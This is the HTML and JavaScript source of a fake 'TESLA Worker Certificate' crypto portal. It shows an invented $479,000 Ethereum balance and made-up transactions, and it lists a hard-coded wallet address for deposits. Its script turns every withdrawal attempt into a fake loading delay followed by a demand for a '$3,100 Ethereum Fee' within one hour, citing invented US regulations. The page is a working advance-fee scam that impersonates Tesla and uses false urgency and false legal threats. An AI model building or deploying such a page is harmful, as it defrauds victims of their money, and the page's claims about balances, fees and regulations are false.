<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TESLA Worker Certificate</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
</head>
<body class="bg-gray-900 text-white font-sans">

  <div class="flex">
    <!-- Sidebar -->
    <aside class="w-64 bg-red-900 p-6 border-r border-red-800">
      <div class="text-center mb-8">
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png" alt="Tesla Logo" class="mx-auto mb-2 w-16 h-16" />
        <h1 class="text-3xl font-bold text-white uppercase tracking-wide">TESLA</h1>
        <p class="text-xs text-gray-300 mt-2">Worker Certificate Portal</p>
      </div>
      <div class="space-y-4">
        <button onclick="showSection('fund')" class="w-full bg-red-600 text-white py-2 rounded-full hover:bg-red-700 transition">Fund Account</button>
        <button onclick="showSection('withdraw')" class="w-full bg-red-800 text-white py-2 rounded-full hover:bg-red-700 transition">Withdraw</button>
      </div>
      <div class="mt-10 text-white text-sm uppercase space-y-2">
        <p>United States of America Standards</p>
        <p>TESLA Worker Certificate</p>
      </div>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 p-8 bg-gray-800">
      <!-- Header -->
      <div class="flex items-center justify-between mb-6">
        <div>
          <h2 class="text-xl text-gray-300">Current Balance</h2>
          <p class="text-5xl font-extrabold text-white">$479,000</p>
          <p class="text-lg text-blue-400 font-bold mt-2">ETHEREUM</p>
        </div>
        <div class="flex items-center space-x-4">
          <div class="text-right">
            <p class="text-lg font-semibold">Elon Tesla-Worker</p>
            <span class="text-xs text-gray-400 uppercase">Certified</span>
          </div>
          <img src="https://www.gravatar.com/avatar?d=mp&s=100" alt="User Profile" class="w-16 h-16 rounded-full border-2 border-red-600" />
        </div>
      </div>

      <!-- ETH Price -->
      <div class="mb-6">
        <h2 class="text-2xl font-bold mb-2">Ethereum Price</h2>
        <p id="ethPrice" class="text-lg text-green-400">Loading...</p>
      </div>

      <!-- Fund Section -->
      <section id="fundSection" class="hidden">
        <h2 class="text-xl font-bold mb-4">Fund Account</h2>
        <p class="mb-2">Send Ethereum to:</p>
        <p class="font-mono bg-gray-700 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
        <div id="qrcode" class="mb-6"></div>
      </section>

      <!-- Withdraw Section -->
      <section id="withdrawSection" class="hidden">
        <h2 class="text-xl font-bold mb-4">Withdraw</h2>
        <div class="space-y-2">
          <input id="walletInput" type="text" placeholder="Wallet Address" class="w-full bg-gray-700 p-2 rounded" />
          <input id="amountInput" type="text" placeholder="Amount (ETH)" class="w-full bg-gray-700 p-2 rounded" />
          <button onclick="startWithdraw()" class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 transition">Confirm</button>
        </div>
      </section>

      <!-- Transaction History -->
      <section class="mt-10">
        <h2 class="text-xl font-bold mb-4">Transaction History</h2>
        <div class="max-h-64 overflow-y-auto space-y-2 pr-2">
          <li class="bg-gray-700 p-2 rounded">[08/29/2025] Deposit +32.10 ETH</li>
          <li class="bg-gray-700 p-2 rounded">[08/28/2025] Withdrawal -30.00 ETH</li>
          <li class="bg-gray-700 p-2 rounded">[08/27/2025] Deposit +32.32 ETH</li>
          <li class="bg-gray-700 p-2 rounded">[08/26/2025] Withdrawal -33.10 ETH</li>
          <li class="bg-gray-700 p-2 rounded">[08/25/2025] Deposit +48.85 ETH</li>
        </div>
      </section>
    </main>
  </div>

  <!-- Spinning Loading Modal -->
  <div id="loadingModal" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-70 flex items-center justify-center hidden z-50">
    <div class="flex flex-col items-center bg-gray-800 p-8 rounded-lg border border-red-400">
      <div class="animate-spin rounded-full h-16 w-16 border-t-4 border-red-500 border-b-4"></div>
      <h3 class="text-white text-lg font-semibold mt-4">Processing withdrawal...</h3>
    </div>
  </div>

  <!-- Error Popup -->
  <div id="errorPopup" class="fixed top-0 left-0 w-full h-full bg-black bg-opacity-80 flex items-center justify-center hidden z-50">
    <div class="bg-gray-800 p-6 rounded-lg text-center max-w-md border border-yellow-400">
      <h3 class="text-yellow-400 text-xl font-bold mb-2">$3,100 Ethereum Fee Required</h3>
      <p class="text-sm mb-4">A fee is required by United States of America cryptocurrency regulations and must be paid within one hour. Failure to pay may result in penalties.</p>
      <p class="text-sm mb-2">Fee Address:</p>
      <p class="font-mono bg-gray-700 p-2 rounded mb-4">0xDf3c635c54765EC040eC323B95BC0FBc7F27a142</p>
      <button onclick="closePopup()" class="bg-red-600 px-4 py-2 rounded hover:bg-red-700 transition">OK</button>
    </div>
  </div>

  <!-- Scripts -->
  <script>
    function showSection(section) {
      document.getElementById('fundSection').style.display = section === 'fund' ? 'block' : 'none';
      document.getElementById('withdrawSection').style.display = section === 'withdraw' ? 'block' : 'none';
    }

    function startWithdraw() {
      document.getElementById('loadingModal').style.display = 'flex';
      setTimeout(() => {
        document.getElementById('loadingModal').style.display = 'none';
        document.getElementById('errorPopup').style.display = 'flex';
      }, 5000); // 5 seconds
    }

    function closePopup() {
      document.getElementById('errorPopup').style.display = 'none';
    }

    async function fetchETHPrice() {
      try {
        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
        const price = res.data.ethereum.usd;
        document.getElementById('ethPrice').innerText = `$${price.toLocaleString()} USD`;
      } catch (err) {
        document.getElementById('ethPrice').innerText = 'Error fetching price';
      }
    }

    fetchETHPrice();
    setInterval(fetchETHPrice, 10000); // Update every 10 seconds

    // QR Code Generation for Ethereum address
    QRCode.toCanvas(document.getElementById("qrcode"), "0xDf3c635c54765EC040eC323B95BC0FBc7F27a142", function (error) {
      if (error) console.error(error);
    });
  </script>
</body>
</html>
